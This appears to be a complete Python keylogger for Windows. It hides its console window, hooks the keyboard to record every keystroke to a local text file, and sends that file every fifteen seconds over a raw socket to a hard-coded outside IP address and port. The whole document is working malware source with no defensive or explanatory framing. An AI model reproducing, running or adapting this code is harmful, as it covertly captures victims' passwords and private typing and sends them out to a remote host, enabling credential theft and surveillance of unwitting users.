import win32api
import win32console
import win32gui
import pythoncom, pyHook
import sys
import socket
import time
from threading import Thread
win = win32console.GetConsoleWindow()
win32gui.ShowWindow(win,0)


#Send file to server every fifteen seconds.

def SendMessage():
    while 1:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect(('107.170.79.196',9010))
        print("Sending log file!")
        log = open('C:\Python27\log.txt','r')
        log.seek(0)
        l = log.read(1024)
        while (l):
            s.send(l)
            l = log.read(1024)
        log.close()
        s.close()
        time.sleep(15)


def OnKeyboardEvent(event):
    if event.Ascii==27:
        sys.exit()  
    if event.Ascii !=0 or 8:
        f=open('C:\Python27\log.txt','r+')
        buffer = f.read()
        f.close()
        f=open('C:\Python27\log.txt','w')
        keylogs=chr(event.Ascii)
        if event.Ascii==13:
            keylogs='\n'
        buffer += keylogs
        f.write(buffer)
        f.close()
        
t = Thread(target=SendMessage, args = ())
t.start()
hm=pyHook.HookManager()
hm.KeyDown=OnKeyboardEvent
hm.HookKeyboard()
pythoncom.PumpMessages()


        
